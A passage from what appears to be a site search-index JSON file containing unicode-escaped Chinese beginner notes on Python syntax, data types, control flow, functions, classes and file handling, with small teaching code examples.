\u5f62\u5f0f\u5c31\u8868\u793a\u4e00\u4e2a\u590d\u6570\uff0c\u5176\u4e2d j \u5373\u865a\u6570\u5355\u4f4d i \u6216\u8005\u4f7f\u7528 complex(\u5b9e\u90e8, \u865a\u90e8) \u5f62\u5f0f\u5b9a\u4e49\u590d\u6570 \u53ef\u4ee5\u8fdb\u884c\u590d\u6570\u7684\u52a0\u51cf\u4e58\u9664\u8fd0\u7b97 \u5c5e\u6027\u4e0e\u65b9\u6cd5 c.real\uff1a\u5b9e\u90e8 c.imag\uff1a\u865a\u90e8 c.conjugate()\uff1a\u8fd4\u56de\u5171\u8f6d\u590d\u6570","title":"\u590d\u6570\u7c7b\u578b"},{"location":"cs/pl/python/basic/#_5","text":"\u5355\u5f15\u53f7 '...'\uff0c\u53cc\u5f15\u53f7 \"...\"\uff0c\u4e09\u5f15\u53f7 '''...''' \"\"\"...\"\"\"\uff08\u53ef\u4ee5\u5185\u90e8\u6362\u884c\uff09 \\n \u6362\u884c\uff0c\\t \u5236\u8868\u7b26\uff0c\\r \u56de\u8f66\uff0c\\' \u5355\u5f15\u53f7\uff0c\\\" \u53cc\u5f15\u53f7\uff0c\\\\ \u659c\u6760\uff08\u53ea\u6253\u4e00\u4e2a \u4f1a\u51fa\u95ee\u9898\uff09\uff0c\u2026\u2026 \u524d\u7f00 r-string\uff1ar\"...\"\uff0c\u5f15\u53f7\u4e2d\u4e0d\u8fdb\u884c\u8f6c\u4e49\uff0c\u5373\u4e00\u4e2a \u5c31\u4ee3\u8868\u659c\u6760\u5b57\u7b26\u672c\u8eab f-string\uff1af\"...\"\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 b-string\uff1ab\"...\"\uff0c\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e3a bytes\uff0c\u53ea\u80fd\u5305\u542b ASCII \u5b57\u7b26 \u5e38\u7528\u65b9\u6cd5 \u62fc\u63a5\uff1a\u76f4\u63a5\u5c06\u5b57\u7b26\u4e32\u201c\u76f8\u52a0\u201d \"...\".upper()\u3001\"...\".lower()\uff1a\u8f6c\u4e3a\u5168\u5927\u5199\u3001\u5168\u5c0f\u5199 \"...\".title()\uff1a\u5355\u8bcd\u9996\u5b57\u6bcd\u5927\u5199 \"...\".strip()\uff1a\u5220\u9664\u5b57\u7b26\u4e32\u9996\u5c3e\u7a7a\u767d\uff08\u5305\u542b\u7a7a\u683c\u548c\u5236\u8868\u7b26\uff09 \"...\".lstrip()\u3001\"...\".rstrip()\uff1a\u5220\u9664\u5de6\u3001\u53f3\u7aef\u7a7a\u767d \"...\".split(c)\uff1a\u6839\u636e\u5b57\u7b26 c \u6765\u62c6\u5206\u5b57\u7b26\u4e32\u5f97\u5230\u5217\u8868\uff0c\u9ed8\u8ba4\u62c6\u5206\u7a7a\u767d","title":"\u5b57\u7b26\u4e32"},{"location":"cs/pl/python/basic/#_6","text":"\u7c7b\u4f3c\u5b57\u7b26\u4e32\uff0c\u4f46\u5b58\u50a8\u7684\u662f\u5b57\u8282\u7684\u503c\uff0c\u66f4\u50cf\u5217\u8868\uff0c\u663e\u793a\u4e3a b\"...\" \u53ea\u662f\u66f4\u52a0\u6613\u8bfb\u800c\u5df2 b\"...\" \u5219\u8868\u793a\u5b57\u8282\u7c7b\u578b\uff0c\u5176\u4e2d\u53ea\u80fd\u5305\u542b ASCII \u5b57\u7b26\u548c \\x.. \u8868\u793a\u7684\u5341\u516d\u8fdb\u5236\u6570 \u4e0e\u5b57\u7b26\u4e32\u8f6c\u6362 \"...\".encode(encoding) \u6839\u636e encoding \u7f16\u7801\u5b57\u7b26\u4e32\uff0c\u9ed8\u8ba4 UTF-8 bytes_obj.decode(encoding) \u6839\u636e encoding \u89e3\u7801\u5b57\u8282\u5e8f\u5217\uff0c\u89e3\u7801\u5931\u8d25\u4f1a\u62a5\u9519 bytes(\"...\", encoding) \u4e5f\u662f\u6839\u636e encoding \u7f16\u7801\u5b57\u7b26\u4e32 \u4e0d\u8981\u4f7f\u7528 str(b\"...\") \u6765\u5c06\u5b57\u8282\u5e8f\u5217\u8f6c\u4e3a\u5b57\u7b26\u4e32","title":"\u5b57\u8282\u7c7b\u578b"},{"location":"cs/pl/python/basic/#_7","text":"True \u548c False\uff0c\u8bb0\u4f4f\u9996\u5b57\u6bcd\u5927\u5199 \u7528 bool(...) \u6765\u8f6c\u6362\uff0c\u5982\u679c\u662f\u6570\u5b57\u5219\u975e\u96f6\u90fd\u662f True\uff0c\u5982\u679c\u662f\u5b57\u7b26\u4e32\u5219\u975e\u7a7a\u90fd\u662f True \u8fd0\u7b97 \u53ef\u4ee5\u4f7f\u7528 & | \u6765\u8868\u793a\u4e0e\u548c\u6216\uff08\u4f46\u5e76\u4e0d\u4f1a\u77ed\u8def\uff09 \u4e00\u822c\u4f7f\u7528 and or not \u8fdb\u884c\u4e0e/\u6216/\u975e\u8fd0\u7b97\uff08\u4f1a\u77ed\u8def\uff09","title":"\u5e03\u5c14\u7c7b\u578b"},{"location":"cs/pl/python/basic/#_8","text":"\u7c7b\u4f3c\u5176\u5b83\u8bed\u8a00\u7684\u6570\u7ec4\uff0c\u4f46\u662f\u529f\u80fd\u66f4\u591a\uff0c\u800c\u4e14\u5185\u90e8\u5143\u7d20\u4e0d\u8981\u6c42\u540c\u4e00\u7c7b\u578b \u65b9\u62ec\u53f7 [] \u8868\u793a\u5217\u8868\uff0c\u5143\u7d20\u7528\u9017\u53f7\u5206\u9694 \u7d22\u5f15\uff08\u5373\u4e0b\u6807\uff09\u4ece 0 \u5f00\u59cb\u8ba1\u6570\uff0clst[n] \u5373\u8868\u793a\u8bbf\u95ee\u7b2c n+1 \u4e2a\u5143\u7d20 \u7d22\u5f15\u53ef\u4ee5\u662f\u8d1f\u6570\uff0c\u8d1f\u6570\u5373\u8868\u793a\u5012\u6570\uff0c\u4f8b lst[-2] \u8868\u793a\u5012\u6570\u7b2c\u4e8c\u4e2a\u5143\u7d20 \u5207\u7247\uff08\u83b7\u53d6\u5217\u8868\u4e2d\u7684\u4e00\u90e8\u5206\u503c\uff09 lst[a:b]\uff1a\u4ece lst[a] \u5230 lst[b-1] \u7684\u5217\u8868 lst[:b]\uff1a\u4ece\u5f00\u5934\u5230 lst[b-1] \u7684\u5217\u8868 lst[a:]\uff1a\u4ece lst[a] \u5230\u7ed3\u5c3e\u7684\u5217\u8868 lst[:]\uff1a\u8868\u793a\u6574\u4e2a\u5217\u8868\uff08\u62f7\u8d1d\u4e00\u4efd\uff09 lst[a:b:c]\uff1a\u4ece lst[a] \u5230 lst[b-1] \u6bcf c \u4e2a\uff08\u5373\u6b65\u957f\uff09\u53d6\u4e00\u4e2a\u5f62\u6210\u7684\u5217\u8868 c \u53ef\u4ee5\u662f\u8d1f\u6570\uff0c\u6b64\u65f6\u9700\u8981 a > b \u624d\u80fd\u83b7\u53d6\u5230\u503c \u6709\u6b65\u957f\u65f6\u82e5\u7701\u7565 a\u3001b \u8bb0\u5f97\u4e0d\u8981\u7701\u7565\u5192\u53f7\uff0c\u4f8b lst[::-1] \u8868\u793a\u5217\u8868\u5012\u5e8f","title":"\u5217\u8868"},{"location":"cs/pl/python/basic/#_10","text":"\u53ef\u4ee5\u770b\u6210\u5143\u7d20\u4e0d\u53ef\u53d8\u7684\u5217\u8868\uff0c\u5185\u90e8\u4e5f\u53ef\u4ee5\u5305\u542b\u4e0d\u540c\u7c7b\u578b\u7684\u5143\u7d20 \u62ec\u53f7\u8868\u793a\u5143\u7ec4\uff0c\u5185\u90e8\u5143\u7d20\u95f4\u7528\u9017\u53f7\u5206\u9694 \u53ef\u4ee5\u4f7f\u7528\u548c\u5217\u8868\u4e00\u6837\u7684\u65b9\u6cd5\u6765\u8bfb\u53d6\u5143\u7d20\uff0c\u4f46\u5e76\u4e0d\u80fd\u4fee\u6539 \u5f53\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\u7684\u65f6\u5019\u8981\u5199\u6210 (a,) \u800c\u4e0d\u662f (a)\uff08\u540e\u8005\u662f\u5355\u4e2a\u503c\uff09 \u53ef\u4ee5\u4f7f\u7528 tuple(...) \u6765\u5c06\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff08\u5217\u8868\u3001\u5b57\u7b26\u4e32\u7b49\uff09\u8f6c\u4e3a\u5143\u7ec4 \u5143\u7ec4\u5e76\u4e0d\u80fd\u4fdd\u8bc1\u5143\u7d20\u5b8c\u5168\u4e0d\u53ef\u53d8 \u907f\u514d\u5728\u5143\u7ec4\u4e2d\u5b58\u653e\u53ef\u53d8\u5143\u7d20","title":"\u5143\u7ec4"},{"location":"cs/pl/python/basic/#_11","text":"\u5927\u62ec\u53f7\u62ec\u8d77\u6765\uff0c\u5185\u90e8\u5143\u7d20\u95f4\u7528\u9017\u53f7\u5206\u9694\uff0c\u4f1a\u81ea\u52a8\u53bb\u91cd \u53ef\u7528 set(...) \u6765\u5c06\u53ef\u8fed\u4ee3\u5bf9\u8c61\u8f6c\u4e3a\u5143\u7ec4\uff0c\u81ea\u52a8\u53bb\u91cd \u96c6\u5408\u4e2d\u4e0d\u80fd\u5305\u542b\u5217\u8868\u7b49\u4e0d\u53ef hash \u5316\u7684\u5143\u7d20 \u4fee\u6539 s.add(...) \u6765\u52a0\u5165\u4e00\u4e2a\u5143\u7d20 s.remove(...) \u5220\u9664\u4e00\u4e2a\u5143\u7d20\uff0c\u5982\u679c\u6ca1\u6709\u4f1a\u629b\u51fa\u5f02\u5e38 s.discard(...) \u6765\u5220\u9664\u4e00\u4e2a\u5143\u7d20\uff0c\u5982\u679c\u6ca1\u6709\u5219\u5ffd\u7565 \u8fd0\u7b97 s1 & s2\u3001s1 | s2\u3001s1 - s2 \u4ea4\u96c6\u3001\u5e76\u96c6\u3001\u5dee\u96c6 s1 ^ s2 \u5bf9\u79f0\u5dee\u96c6","title":"\u96c6\u5408"},{"location":"cs/pl/python/basic/#_12","text":"\u5b58\u50a8\u952e\u503c\u5bf9\uff0c\u4e5f\u662f\u5927\u62ec\u53f7\u62ec\u8d77\u6765\uff0c\u4e0d\u8fc7\u9017\u53f7\u5206\u9694\u7684\u662f\u952e\u503c\u5bf9 {key: value, ...} {} \u662f\u7a7a\u5b57\u5178\u800c\u4e0d\u662f\u7a7a\u96c6\u5408 \u901a\u8fc7 d[key] \u6765\u8bbf\u95ee\u5b57\u5178\u4e2d key \u5bf9\u5e94\u7684\u503c\uff0c\u53ef\u4ee5\u8bfb\u53d6\u3001\u4fee\u6539 \u6dfb\u52a0\u952e\u503c\u5bf9\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 d[key] = value \u6765\u8fdb\u884c \u5220\u9664\u952e\u503c\u5bf9\u53ef\u4ee5\u76f4\u63a5 del d[key] \u901a\u8fc7 d[key] \u8bbf\u95ee\u503c\u65f6\u5982\u679c\u4e0d\u5b58\u5728 key \u8fd9\u4e2a\u952e\u4f1a\u629b\u51fa\u5f02\u5e38 \u901a\u8fc7 d.get(key) \u6765\u8bbf\u95ee\u503c\u65f6\u5982\u679c\u4e0d\u5b58\u5728\u5219\u4f1a\u8fd4\u56de None \u4f7f\u7528 d.get(key, default) \u5982\u679c\u6ca1\u6709 key \u65f6\u4f1a\u8fd4\u56de default \u503c d.update(d2) \u6765\u7528 d2 \u4e2d\u7684\u952e\u503c\u5bf9\u66f4\u65b0 d","title":"\u5b57\u5178"},{"location":"cs/pl/python/basic/#_13","text":"","title":"\u6761\u4ef6\u5206\u652f"},{"location":"cs/pl/python/basic/#_14","text":"== \u5224\u65ad\u76f8\u7b49\uff08\u76f8\u7b49\u5219\u8fd4\u56de True\uff09\uff0c != \u5224\u65ad\u4e0d\u7b49 \u4f7f\u7528 and or not \u6765\u8fdb\u884c\u5e03\u5c14\u8fd0\u7b97\uff0c\u5fc5\u8981\u65f6\u52a0\u62ec\u53f7\u4fdd\u8bc1\u4f18\u5148\u7ea7 \u6570\u503c\u6bd4\u8f83\u5927\u5c0f < <= > >= \u5224\u65ad\u5143\u7d20\u662f\u5426\u5728\u5217\u8868\u4e2d value in lst\uff1a\u5982\u679c\u5728\u5219\u503c\u4e3a True value not in lst\uff1a\u5982\u679c\u5728\u5219\u4e3a False\uff08\u5224\u65ad\u662f\u5426\u4e0d\u5728\uff09 \u5224\u65ad\u952e\u662f\u5426\u5728\u5b57\u5178\u4e2d key in d\u3001key not in d \u4e0e\u5217\u8868\u540c\u7406","title":"\u5e03\u5c14\u8868\u8fbe\u5f0f"},{"location":"cs/pl/python/basic/#_15","text":"if-elif-else \u7ed3\u6784\uff08\u4e0d\u662f else if\uff09 elif\u3001else \u5747\u53ef\u4ee5\u7701\u7565 \u6761\u4ef6\u4e0d\u9700\u8981\u52a0\u62ec\u53f7\uff08\u52a0\u4e86\u4e5f\u6ca1\u95ee\u9898\uff09 condition \u4f1a\u88ab\u8f6c\u6362\u6210 bool \u7c7b\u578b\u7136\u540e\u5224\u65ad \u6ce8\u610f\u7f29\u8fdb \u7c7b\u4e09\u76ee\u8fd0\u7b97\u7b26\u5199\u6cd5 a if condition else b \u7c7b\u4f3c\u5176\u5b83\u8bed\u8a00\u4e2d\u7684 condition? a : b if condition1 : ... elif condition2 : ... elif condition3 : ... else : ...","title":"\u6761\u4ef6\u8bed\u53e5"},{"location":"cs/pl/python/basic/#_16","text":"\u7f29\u8fdb\u662f python \u4e2d\u5f88\u91cd\u8981\u7684\u4e1c\u897f\uff0cpython \u9760\u7f29\u8fdb\u6765\u5f97\u5230\u4ee3\u7801\u7ed3\u6784\uff0c\u800c\u4e0d\u662f\u5927\u62ec\u53f7 \u7f29\u8fdb\u53ef\u4ee5\u4f7f\u7528\u7a7a\u683c\u6216\u5236\u8868\u7b26 \u5982\u679c\u4e00\u4e9b\u4ee3\u7801\u5904\u4e8e\u540c\u4e00\u5c42\u7f29\u8fdb\u4e0b\uff0c\u5219\u5c5e\u4e8e\u540c\u4e00\u4e2a\u4ee3\u7801\u5757 \u540c\u4e00\u4e2a\u4ee3\u7801\u5757\u7684\u7f29\u8fdb\u8981\u7edf\u4e00 \u4e0d\u4ec5\u4ec5\u662f\u770b\u7740\u50cf\uff0c\u8981\u533a\u5206\u597d\u7a7a\u683c\u4e0e\u5236\u8868\u7b26 4 \u4e2a\u7a7a\u683c\u4e0e\u4e00\u4e2a\u663e\u793a\u5bbd\u5ea6\u4e3a 4 \u7684\u5236\u8868\u7b26\u5e76\u4e0d\u662f\u540c\u4e00\u7f29\u8fdb \u4e00\u822c\u4f7f\u7528 4 \u7a7a\u683c\u7f29\u8fdb\uff0c\u6216\u8005 1 \u5236\u8868\u7b26\u7f29\u8fdb \u7f16\u8f91\u5668\u4e2d\u6309 Tab \u6253\u51fa\u7684\u4e5f\u4e0d\u4e00\u5b9a\u662f\u5236\u8868\u7b26\uff0c\u8981\u5206\u6e05 \u7f29\u8fdb\u4e0d\u6b63\u786e\u4f1a\u62a5 IndentationError\uff0c\u6b64\u65f6\u6ce8\u610f\u68c0\u67e5\u7f29\u8fdb","title":"\u7f29\u8fdb"},{"location":"cs/pl/python/basic/#_17","text":"","title":"\u5faa\u73af"},{"location":"cs/pl/python/basic/#for","text":"python \u4e2d\u7684 for \u5faa\u73af\u5e76\u4e0d\u50cf c \u4e2d\u662f\u6307\u5b9a\u4e00\u4e2a\u53d8\u91cf\u7684\u53d8\u5316\u65b9\u5f0f\uff0c\u800c\u662f\u4ece\u5217\u8868/\u5143\u7ec4/\u8fed\u4ee3\u5668\u7b49\u53ef\u8fed\u4ee3\u5bf9\u8c61\u4e2d\u904d\u5386\u503c for \u5faa\u73af\u4f1a\u4ea7\u751f\u4e00\u4e2a\u7528\u4e8e\u5faa\u73af\u7684\u53d8\u91cf\uff0c\u8fd9\u4e2a\u53d8\u91cf\u5728\u5faa\u73af\u7ed3\u675f\u540e\u5e76\u4e0d\u4f1a\u5220\u9664\uff0c\u800c\u662f\u4fdd\u7559\u6700\u540e\u4e00\u6b21\u7684\u503c \u53ef\u4ee5\u4f7f\u7528 range \u6765\u751f\u6210\u4e00\u4e32\u6570\u5b57\u7528\u6765\u5faa\u73af range(a, b) \u751f\u6210\u4ece a \u5230 b-1 \u7684\u8fde\u7eed\u6574\u6570 range(a, b, c) \u4ee5 c \u4e3a\u6b65\u957f\u751f\u6210 range \u5f97\u5230\u7684\u5e76\u4e0d\u662f\u5217\u8868\uff0c\u5982\u679c\u8981\u7528\u5176\u751f\u6210\u5217\u8868\u8981\u4f7f\u7528 list(range(...)) for value in lst : ... for value in range ( ... ): ...","title":"for \u5faa\u73af"},{"location":"cs/pl/python/basic/#while","text":"while \u5faa\u73af\u5373\u8fdb\u884c\u6761\u4ef6\u68c0\u67e5\uff0c\u5982\u679c\u4e3a True \u5219\u7ee7\u7eed\u8fd0\u884c\u76f4\u5230\u6761\u4ef6\u4e0d\u6ee1\u8db3\u505c\u6b62 while condition : ...","title":"while \u5faa\u73af"},{"location":"cs/pl/python/basic/#_22","text":"","title":"\u51fd\u6570"},{"location":"cs/pl/python/basic/#_23","text":"\u4f7f\u7528 def \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u51fd\u6570 \u5148\u51fd\u6570\u540d\uff0c\u7136\u540e\u62ec\u53f7\u5217\u51fa\u53c2\u6570\uff0c\u4e0b\u9762\u63a5\u4ee3\u7801\u5757 \u4f7f\u7528 return \u8fd4\u56de \u6ca1\u6709 return \u8fd0\u884c\u5230\u7ed3\u5c3e\uff0c\u8fd4\u56de None \u53ea\u6709 return\uff0c\u8fd4\u56de None return \u540e\u63a5\u5185\u5bb9\uff0c\u8fd4\u56de\u5185\u5bb9 return \u7684\u503c\u7c7b\u578b\u4e0d\u8981\u6c42\u4e00\u81f4 return \u53ef\u4ee5\u8fd4\u56de\u591a\u4e2a\u503c\uff08\u5229\u7528\u5143\u7ec4\uff09 def func_name ( arg1 , arg2 ): ... def func_name ( arg1 , arg2 ): ... return ... def func_name ( arg1 , arg2 ): ... return ... , ...","title":"\u51fd\u6570\u5b9a\u4e49"},{"location":"cs/pl/python/basic/#_24","text":"\u62ec\u53f7\u4e2d\u8981\u5217\u51fa\u53c2\u6570\u540d\uff0c\u4f9b\u51fd\u6570\u4f53\u5185\u4f7f\u7528 \u53ef\u4ee5\u5728\u53c2\u6570\u540e\u63a5\u7b49\u53f7\u8d4b\u9ed8\u8ba4\u503c \u4f7f\u7528\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u5728\u8c03\u7528\u65f6\u53ef\u4ee5\u4e0d\u7528\u4f20 \u5229\u7528 * \u6765\u63a5\u6536\u4efb\u610f\u591a\u53c2\u6570 \u63a5\u6536\u8fdb\u6765\u662f\u4e00\u4e2a\u5143\u7ec4 * \u53c2\u6570\u540e\u9762\u4e0d\u80fd\u518d\u6709\u5176\u5b83\u975e\u5173\u952e\u5b57\u53c2\u6570 \u5229\u7528 ** \u6765\u63a5\u6536\u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570 \u63a5\u6536\u8fdb\u6765\u662f\u4e00\u4e2a\u5b57\u5178 def func ( arg1 , arg2 ): ... def func ( arg1 , arg2 = \"...\" ): # \u9ed8\u8ba4\u503c ... def func ( arg1 , * arg2 ): # \u4efb\u610f\u591a\u53c2\u6570 ... def func ( arg1 , ** arg2 ): # \u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570 ... def func ( arg1 , * arg2 , ** arg3 ): ... # *arg2 \u540e\u53ef\u4ee5\u52a0 **arg3","title":"\u51fd\u6570\u53c2\u6570"},{"location":"cs/pl/python/basic/#_25","text":"\u901a\u8fc7 \u51fd\u6570\u540d(\u53c2\u6570) \u6765\u8c03\u7528\u51fd\u6570\uff0c\u5f97\u5230\u8fd4\u56de\u503c \u76f4\u63a5\u4f20\u53c2\u7684\u8bdd\u8981\u5c06\u53c2\u6570\u4e0e\u5b9a\u4e49\u5bf9\u5e94\u4e0a \u901a\u8fc7\u5173\u952e\u5b57\u4f20\u53c2\uff08\u53c2\u6570\u540d\uff09\u53ef\u4ee5\u6253\u4e71\u987a\u5e8f \u5e26\u6709\u9ed8\u8ba4\u503c\u7684\u53c2\u6570\u5982\u679c\u4e0d\u4f20\u5219\u4f7f\u7528\u9ed8\u8ba4\u503c \u5982\u679c\u8bfb\u4efb\u610f\u591a\u5173\u952e\u5b57\u53c2\u6570\uff0c\u5219\u591a\u4f59\u7684\u8bfb\u5230\u5b57\u5178\u4e2d def func ( a , b ): ... func ( 1 , 2 ) # a = 1, b = 2 func ( b = 1 , a = 2 ) # a = 2, b = 1 def func2 ( a , ** b ): ... func2 ( a = 1 , b = 2 , c = 3 ) ## a = 1, b = {\"b\": 2, \"c\": 3}","title":"\u51fd\u6570\u8c03\u7528"},{"location":"cs/pl/python/basic/#_26","text":"python \u4e2d\u7684\u53d8\u91cf\u90fd\u662f\u5f15\u7528\u7684\uff08\u8fd9\u4e5f\u5c31\u662f\u4e3a\u4ec0\u4e48\u524d\u9762\u8bf4\u4e0d\u8981\u5c06\u53d8\u91cf\u7406\u89e3\u4e3a\u76d2\u5b50\uff09 \u7528 = \u5b9e\u9645\u4e0a\u662f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u522b\u540d lst1 = lst2\uff0c\u5219 lst1 \u548c lst2 \u4f1a\u540c\u65f6\u53d8\u5316\uff08\u8981\u7528 [:] \u521b\u5efa\u526f\u672c\uff09 \u6570\u503c\u7c7b\u578b\u6709\u4f18\u5316\uff0c\u6240\u4ee5\u4e0d\u4f1a\u8fd9\u6837 == \u68c0\u67e5\u503c\u662f\u5426\u76f8\u7b49\uff0cis \u68c0\u67e5\u503c\u662f\u5426\u76f8\u540c \u89c2\u5bdf pythontutor.com \u51fd\u6570\u53c2\u6570\u4f20\u9012\u53ea\u6709\u201c\u5171\u4eab\u4f20\u53c2\u201d\u4e00\u79cd\u5f62\u5f0f\uff08\u5373\u4f20\u5f15\u7528\uff09 \u53ef\u53d8\u53d8\u91cf\uff08\u4f8b\u5982\u5217\u8868\uff09\u5728\u51fd\u6570\u5185\u90e8\u53ef\u4ee5\u88ab\u6539\u53d8 \u907f\u514d\u5411\u51fd\u6570\u4f20\u9012\u53ef\u53d8\u53d8\u91cf\uff08\u5217\u8868\u53ef\u4f20\u5165 [:] \u521b\u5efa\u7684\u526f\u672c\uff09","title":"*\u5f15\u7528\u53d8\u91cf"},{"location":"cs/pl/python/basic/#_27","text":"\u53ef\u4ee5\u901a\u8fc7 lambda \u8868\u8fbe\u5f0f\u6765\u5b9a\u4e49\u533f\u540d\u51fd\u6570 lambda \u8f93\u5165: \u8f93\u51fa\u8868\u8fbe\u5f0f \u53ef\u4ee5\u6709\u591a\u4e2a\u8f93\u5165 \u53ef\u4ee5\u5c06\u4e00\u4e2a\u51fd\u6570\u8d4b\u503c\u7ed9\u4e00\u4e2a\u53d8\u91cf \u907f\u514d\u7528 lambda \u8d4b\u503c\u7684\u5f62\u5f0f\u5b9a\u4e49\u51fd\u6570 \u4f8b\u5982 __name__ \u5c5e\u6027\u4e0d\u4f1a\u662f\u51fd\u6570\u540d\uff0c\u800c\u662f \"\\<lambda>\" lambda a : a ** 2 + 2 * a + 1 ( lambda a : a ** 2 + 2 * a + 1 )( 2 ) # 9 lambda a , b : a * 2 + b f = lambda a : a ** 2 + 2 * a + 1 ## \u8fd1\u4f3c\u7b49\u4ef7\u4e8e def f ( a ): return a ** 2 + 2 * a + 1","title":"\u533f\u540d\u51fd\u6570"},{"location":"cs/pl/python/basic/#_28","text":"\u8bfb\u53d6\u7528\u6237\u8f93\u5165\u4f7f\u7528\u5185\u7f6e\u7684 input \u51fd\u6570 \u51fd\u6570\u53c2\u6570\u4e3a\u8981\u663e\u793a\u7684\u63d0\u793a\u7b26\uff0c\u4f8b\u5982 input(\"> \") \u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32 \u6bcf\u6b21\u8bfb\u5165\u4e00\u884c\uff08\u5373\u8bfb\u5230\u6362\u884c\u4e3a\u6b62\uff09","title":"\u7528\u6237\u8f93\u5165"},{"location":"cs/pl/python/basic/#_29","text":"\u63a5\u6536\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u7684\u51fd\u6570\u88ab\u79f0\u4e3a\u9ad8\u9636\u51fd\u6570 \u6bd4\u8f83\u5e38\u7528\u7684\u6709 map\u3001filter list ( map ( lambda x : x * 2 , [ 1 , 2 ])) ## [2, 4] list ( filter ( lambda x : x > 1 , [ 1 , 2 , 3 ])) ## [2, 3]","title":"\u9ad8\u9636\u51fd\u6570\u7528\u6cd5"},{"location":"cs/pl/python/basic/#_30","text":"","title":"\u7c7b\u4e0e\u9762\u5411\u5bf9\u8c61"},{"location":"cs/pl/python/basic/#_31","text":"\u7c7b\u53ef\u4ee5\u770b\u6210\u5305\u542b\u4e00\u4e9b \u5c5e\u6027 \u548c \u65b9\u6cd5 \u7684\u6846\u67b6 \u6839\u636e\u7c7b\u6765\u521b\u5efa\u5bf9\u8c61 -> \u5b9e\u4f8b\u5316 \u7528 class \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u7c7b \u7c7b\u4e2d\u7684\u51fd\u6570 -> \u65b9\u6cd5 \u7279\u6b8a\u65b9\u6cd5 __init__\uff0c\u5728\u7c7b\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528 \u5176\u5b83\u4e00\u822c\u7684\u65b9\u6cd5\u7b2c\u4e00\u4e2a\u53c2\u6570\u90fd\u8981\u4e3a\"self\"\uff0c\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u4f20\u5165 \u76f4\u63a5\u5199\u5728\u7c7b\u4e2d\u7684\u662f\u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4e3a self.\\<name> \u8d4b\u503c\u7684\u5f62\u5f0f\u521b\u5efa\u5c5e\u6027 \u7528\u7c7b\u4f3c\u51fd\u6570\u8c03\u7528\u7684\u5f62\u5f0f\u5b9e\u4f8b\u5316\u7c7b\uff0c\u53c2\u6570\u4e3a__init__\u65b9\u6cd5\u7684\u53c2\u6570 \u76f4\u63a5\u901a\u8fc7 .\\<method> .\\<attribute> \u7684\u5f62\u5f0f\u8c03\u7528\u65b9\u6cd5/\u83b7\u53d6\u5c5e\u6027 class ClassName (): a = 1 def __init__ ( self , arg1 , arg2 ): self . arg1 = arg1 self . arg2 = arg2 def method ( self ): print ( self . arg1 , self . arg2 , self . a ) obj = ClassName ( 2 , 3 ) obj . method () # 2 3 1 print ( obj . a , obj . arg1 ) # 1 2","title":"\u7c7b"},{"location":"cs/pl/python/basic/#_34","text":"python \u4e2d\u5373\u4f7f\u6700\u7b80\u5355\u7684\u6574\u6570\u4e5f\u662f\u4e00\u4e2a\u7c7b\u7684\u5b9e\u4f8b \u901a\u8fc7 dir(...) \u67e5\u770b\u4e00\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027/\u65b9\u6cd5 \u6709\u5f88\u591a\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\u3001\u53cc\u4e0b\u5212\u7ebf\u7ed3\u5c3e\u7684\u65b9\u6cd5\uff0c\u6210\u4e3a\u9b54\u672f\u65b9\u6cd5\uff08dunder method\uff09","title":"\u4e00\u5207\u7686\u5bf9\u8c61\uff1f"},{"location":"cs/pl/python/basic/#_36","text":"","title":"\u6742\u9879\u5185\u5bb9"},{"location":"cs/pl/python/basic/#_37","text":"open \u51fd\u6570\uff0c\u4f20\u5165\u6587\u4ef6\u540d\u3001\u6253\u5f00\u6a21\u5f0f \u6253\u5f00\u6a21\u5f0f\uff08\u53ef\u4ee5\u53e0\u52a0\uff09\uff1ar \u8bfb\uff08\u9ed8\u8ba4\uff09\u3001w \u5199\u3001x \u521b\u5efa\u5e76\u5199\u3001a \u5199\u5728\u672b\u5c3e\u3001b \u5b57\u8282\u6a21\u5f0f\u3001t \u6587\u672c\u6a21\u5f0f\uff08\u9ed8\u8ba4\uff09 \u8bfb\u53d6 \u6587\u672c\u6a21\u5f0f\u5efa\u8bae\u52a0\u4e0a encoding\uff0c\u4e0d\u7136\u5bb9\u6613\u62a5\u9519 f.read() \u8bfb\u53d6\u5168\u90e8\u5185\u5bb9\uff08\u5b57\u8282\u6a21\u5f0f\u5f97\u5230\u5b57\u8282\u5e8f\u5217\uff09 f.readline() \u8bfb\u53d6\u4e00\u884c f.readlines() \u8bfb\u53d6\u6240\u6709\u884c\uff0c\u8fd4\u56de\u4e00\u4e2a\u5217\u8868 \u5199\u5165 \u6587\u672c\u6a21\u5f0f\u540c\u6837\u5efa\u8bae\u52a0\u4e0a encoding f.write(...) \u76f4\u63a5\u5199\u5165 f.writelines(...) \u4f20\u5165\u5217\u8868\uff0c\u5143\u7d20\u95f4\u6362\u884c\u5199\u5165 \u901a\u8fc7\u8fd9\u79cd\u5f62\u5f0f\u64cd\u4f5c\u6587\u4ef6\u8bb0\u5f97\u7528\u5b8c\u540e\u8981 f.close() f = open ( \"filename\" , \"r\" , encoding = \"utf-8\" ) s = f . read () # a str ## line = f.readline() # a str ## lines = f.readlines() # a list ... f . close () f = open ( \"filename\" , \"w\" , encodeing = \"utf-8\" ) f . write ( \"...\" ) f . writelines ([ \"...\" , \"...\" ]) ... f . close ()","title":"\u6587\u4ef6\u64cd\u4f5c"},{"location":"cs/pl/python/basic/#with","text":"with ... as ...: \u5f00\u542f\u4e00\u4e2a\u4e0a\u4e0b\u6587\u7ba1\u7406\u5668 \u5e38\u7528\u5728\u6587\u4ef6 open \u4e0a with \u5757\u5f00\u59cb\u81ea\u52a8\u6253\u5f00 with 